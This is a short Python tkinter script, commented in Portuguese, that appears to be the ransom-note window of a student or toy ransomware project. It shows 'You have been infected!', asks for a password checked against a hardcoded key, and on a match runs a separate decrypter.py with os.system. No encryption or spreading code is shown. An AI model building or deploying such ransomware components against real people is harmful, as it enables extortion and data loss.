import os
import tkinter as tk #dando um apelido pra fcar mais facil digitar
#tkinter trabalha em aplicacoes com interface grafica

key = b"testeransomwares"

# Criando janela
window = tk.Tk()
window.geometry("300x150")
window.title("Gerenciador de Frases")

#Adicionando o Frame
frame = tk.Frame(window)
frame.pack(padx=10, pady=10, fill='x', expand=True) #importante para orgnizar os elementos

# Adicionando o label
label = tk.Label(frame, text="You have been infected!")
label.pack(fill='x', expand=True)

# Adicionando o input
frase_lab = tk.Label(frame, text="What's the password?")
frase_lab.pack(fill='x', expand=True)

frase_inpt = tk.Entry(frame)
frase_inpt.pack(fill='x', expand=True)

# Funcao para alterar o texto
def click():
    user_input = frase_inpt.get().encode() #obetemos a entrada e transformamos em bytes
    if user_input == key:
        os.system("python decrypter.py")
        label.config(text="Thank you :D")
    else:
        label.config(text="Deny >:(")

# Adicionando Botao
button = tk.Button(frame, text="Send", command=click)
button.pack()

window.mainloop()
